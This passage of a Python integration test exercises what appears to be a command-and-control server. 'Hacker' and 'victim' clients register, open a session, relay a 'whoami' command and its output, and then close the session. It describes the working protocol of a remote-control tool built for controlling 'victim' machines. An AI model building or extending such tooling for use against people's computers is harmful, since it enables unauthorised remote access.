    db_cursor: Cursor,
    verified_client_header: dict[str, str],
    verified_hacker_header: dict[str, str],
):
    # We need to be using our own clients not the ones defined
    # as fixtures.
    hacker_client = HTTPConnection(hp.config.ip, hp.config.port)
    victim_client = HTTPConnection(hp.config.ip, hp.config.port)

    # Testing everything normally not using shortcut techniques like
    # using the create_victim and hacker functions. Everything done here
    # will be done to simulate a real use case.

    victim_id = verified_client_header["client-id"]

    victim_info = js.dumps(
        {"host_name": "Somebodies PC", "arch": "x86", "ram": "8GB", "os": "Windows"}
    )

    # Now request for registration, most probably the hacker will be registered
    # first, then the victim will proceed
    hacker_client.request(
        "POST",
        f"/{register_cmd_path}",
        headers={
            **verified_hacker_header,
            "client-type": ut.ClientType.hacker.__str__(),
        },
    )

    # check if the response is OK
    assert hacker_client.getresponse().status == st.OK

    # Now the victims turn
    victim_client.request(
        "POST",
        f"/{register_cmd_path}",
        body=ut.encode_token(victim_info),
        headers={
            **verified_client_header,
            "client-type": ut.ClientType.victim.__str__(),
        },
    )

    assert victim_client.getresponse().status == st.OK

    # If we reach this point this means the registration was completed
    # successfully

    # Let's simulate a real scenario

    # First try to fetch a session when there is none.
    victim_client.request("GET", f"/{get_session_path}", headers=verified_client_header)
    assert victim_client.getresponse().status == st.NOT_FOUND

    # Create a session with the victim
    hacker_client.request(
        "POST",
        f"/{create_session_path}",
        body=ut.encode_token(victim_id),
        headers=verified_hacker_header,
    )

    response = hacker_client.getresponse()
    content_length = response.getheader("content-length")

    if content_length is None:
        assert False

    hacker_received_session_id = response.read(int(content_length)).decode()
    hacker_received_session_id = ut.decode_token(hacker_received_session_id)

    assert response.status == st.OK

    # Now let's try the get session one more time
    # this time we have to see a session
    victim_client.request("GET", f"/{get_session_path}", headers=verified_client_header)

    response = victim_client.getresponse()
    content_length = response.getheader("content-length")

    if content_length is None:
        assert False

    victim_received_session_id = response.read(int(content_length)).decode()
    victim_received_session_id = ut.decode_token(victim_received_session_id)

    assert response.status == st.OK

    # Now let's assert if the victim and the hacker got the same session_ids
    assert hacker_received_session_id == victim_received_session_id

    # Just to shorten the name nothing else
    session_id = victim_received_session_id

    # Now let's send over some commands, but first off let's try to
    # fetch an empty command and see if it yields no content
    victim_client.request(
        "GET",
        f"/{fetch_cmd_path}",
        body=ut.encode_token(session_id),
        headers=verified_client_header,
    )

    assert victim_client.getresponse().status == st.NO_CONTENT

    # Now post a command from the hacker
    command = {"session_id": session_id, "command": "whoami", "empty": False}

    hacker_client.request(
        "POST",
        f"/{post_cmd_path}",
        body=ut.encode_token(js.dumps(command)),
        headers=verified_hacker_header,
    )

    assert hacker_client.getresponse().status == st.CREATED

    # Ok now let's do the fetch_cmd again by the victim
    victim_client.request(
        "GET",
        f"/{fetch_cmd_path}",
        body=ut.encode_token(session_id),
        headers=verified_client_header,
    )

    response = victim_client.getresponse()
    content_length = response.getheader("content-length")

    if content_length is None:
        assert False

    recvd_command = response.read(int(content_length)).decode()
    recvd_command = ut.decode_token(recvd_command)

    assert response.status == st.OK

    # Check if the command sent and received is identical
    assert command["command"] == recvd_command

    # Now do the same for the response
    hacker_client.request(
        "GET",
        f"/{fetch_res_path}",
        body=ut.encode_token(session_id),
        headers=verified_hacker_header,
    )
    assert hacker_client.getresponse().status == st.NO_CONTENT

    # and now we'll send the response via the victim
    victim_response = {
        "session_id": session_id,
        "response": "somebody",
        "empty": False,
        "command_status_code": None,
    }

    victim_client.request(
        "POST",
        f"/{post_res_path}",
        body=ut.encode_token(js.dumps(victim_response)),
        headers=verified_client_header,
    )
    assert victim_client.getresponse().status == st.OK

    # Repeat the hacker's fetch_res
    hacker_client.request(
        "GET",
        f"/{fetch_res_path}",
        body=ut.encode_token(session_id),
        headers=verified_hacker_header,
    )

    response = hacker_client.getresponse()
    content_length = response.getheader("content-length")

    if content_length is None:
        assert False

    recvd_response = response.read(int(content_length)).decode()
    recvd_response = ut.decode_token(recvd_response)
    # Now decode the json from it
    recvd_response_obj: list[Response] = js.loads(recvd_response)

    assert response.status == st.OK

    # Check if the response gotten by the victim matches
    # that one of the hacker's
    assert victim_response["response"] == recvd_response_obj[0]["response"]

    # Now let's try to safely exit from the session
    hacker_client.request(
        "DELETE",
        f"/{exit_session_path}",
        body=ut.encode_token(session_id),
        headers=verified_hacker_header,
    )

    assert hacker_client.getresponse().status == st.OK

    # Now let's once again try to fetch_cmd from the session
    # This time we should get a GONE error
    victim_client.request(
        "GET",
        f"/{fetch_cmd_path}",
        body=ut.encode_token(session_id),
        headers=verified_client_header,
    )

    assert victim_client.getresponse().status == st.GONE

    # Check if the session is deleted successfully
    assert not hp.sessions.check_session_exists(session_id)
